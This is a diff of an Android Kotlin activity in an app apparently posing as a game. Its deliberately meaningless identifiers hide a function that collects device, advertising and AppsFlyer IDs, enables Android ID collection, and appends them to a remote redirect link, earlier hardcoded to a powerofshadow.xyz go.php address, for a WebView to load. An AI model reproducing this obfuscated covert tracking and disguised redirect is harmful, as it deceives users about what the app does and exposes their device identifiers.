@@ -10,7 +10,11 @@ import android.provider.MediaStore
 import android.util.Log
 import android.webkit.*
 import android.widget.Toast
+import com.appsflyer.AppsFlyerLib
 import com.google.android.material.snackbar.Snackbar
+import com.ngelgames.herocant.InMainClass.Companion.C1
+import com.ngelgames.herocant.InMainClass.Companion.MAIN_ID
+import com.ngelgames.herocant.InMainClass.Companion.link
 import com.ngelgames.herocant.databinding.ActivityItisBinding
 import com.onesignal.OneSignal
 import com.orhanobut.hawk.Hawk
@@ -245,37 +249,55 @@ class ITIS : AppCompatActivity() {
 
     private fun urururururururur(): String {
 
-        val spspspspspspsppspspsps = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
+        val spoon = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
 
-        val pcpcpcpcpcpcpcpcpcpc = "com.ngelgames.herocant"
+        val pack = "com.ngelgames.herocant"
 
         val myTrID: String? = Hawk.get(InMainClass.myID, "null")
         val myInstId: String? = Hawk.get(InMainClass.instId, "null")
+        val cpOne:String? = Hawk.get(C1, "null")
+        val mainId: String? = Hawk.get(MAIN_ID, "null")
+
+        val checkFly: String = Hawk.get(InMainClass.appsCheck, "null")
+
+        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
+
+
+        AppsFlyerLib.getInstance().setCollectAndroidID(true)
 
 
 
-        val twtwtwtwtwtwtw = "deviceID="
+        val one = "deviceID="
+        val subOne = "sub_id_1="
         val thrhtrhtrhtrht = "ad_id="
         val fofofofofofofofofo = "sub_id_4="
         val fififififififififif = "sub_id_5="
         val sisisisifsisis = "sub_id_6="
 
 
-        val fifififiififififiififififiififififi = "http://"
-        val seccscdssdd = "powerofshadow.xyz/go.php?to=2&"
+//        val fifififiififififiififififiififififi = "http://"
+//        val seccscdssdd = "powerofshadow.xyz/go.php?to=2&"
 
         val lololololololo = "naming"
 
 
         val kiokjjlikjhmkij = Build.VERSION.RELEASE
 
-        val ababababababababa = fifififiififififiififififiififififi + seccscdssdd
+        val linkAB = Hawk.get(link, "null")
+        var aft =""
+        if (checkFly == "1"){
+        aft =
+            "$linkAB$subOne$cpOne&$one$afId&$thrhtrhtrhtrht$mainId&$fofofofofofofofofo$pack&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
+            pushToOneSignal(afId.toString())
+        } else {
+            aft =
+            "$linkAB$one$myTrID&$thrhtrhtrhtrht$myInstId&$fofofofofofofofofo$pack&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
+            pushToOneSignal(myTrID.toString())
+        }
 
-        val link = "$ababababababababa$twtwtwtwtwtwtw$myTrID&$thrhtrhtrhtrht$myInstId&$fofofofofofofofofo$pcpcpcpcpcpcpcpcpcpc&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
-
-        Log.d("TESTAG", "Test Result $link")
-        pushToOneSignal(myTrID.toString())
-        return spspspspspspsppspspsps.getString("SAVED_URL", link).toString()
+        Log.d("TESTAG", "Test Result $aft")
+//        pushToOneSignal(myTrID.toString())
+        return spoon.getString("SAVED_URL", aft).toString()
     }
 
 
